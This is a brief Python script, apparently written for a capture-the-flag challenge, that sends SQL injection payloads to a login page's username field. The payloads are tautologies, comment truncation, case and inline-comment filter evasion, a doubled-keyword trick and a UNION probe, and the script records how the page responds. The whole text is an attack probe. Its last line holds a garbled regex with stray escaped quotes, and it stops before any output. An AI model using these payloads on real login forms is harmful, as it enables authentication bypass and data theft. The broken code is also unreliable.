import urllib.parse, urllib.request, re
base='http://6fb2ba677ad56a139506d872.http-ctf2.dasctf.com/check.php'
payloads=[
    (\"baseline\", 'admin', 'admin'),
    (\"single_quote_u\", \"'\", 'x'),
    (\"comment_hash\", \"admin'#\", 'x'),
    (\"comment_dash\", \"admin'-- \", 'x'),
    (\"or_lower\", \"admin'or'1'='1\", 'x'),
    (\"or_case\", \"admin'Or'1'='1\", 'x'),
    (\"or_inline_comment\", \"admin'/**/or/**/'1'='1\", 'x'),
    (\"double_or\", \"admin'oorr'1'='1\", 'x'),
    (\"pipes\", \"admin'||'1'='1\", 'x'),
    (\"union\", \"admin' union select 1\", 'x'),
    (\"select_word\", \"select\", 'x'),
    (\"sleep_word\", \"sleep\", 'x'),
]
for name,u,p in payloads:
    qs=urllib.parse.urlencode({'username':u,'password':p})
    try:
        body=urllib.request.urlopen(base+'?'+qs, timeout=8).read().decode('utf-8','replace')
    except Exception as e:
        print(name, 'ERR', e); continue
    text=' '.join(re.sub('<["'^>]+>'"',' ',body).split())
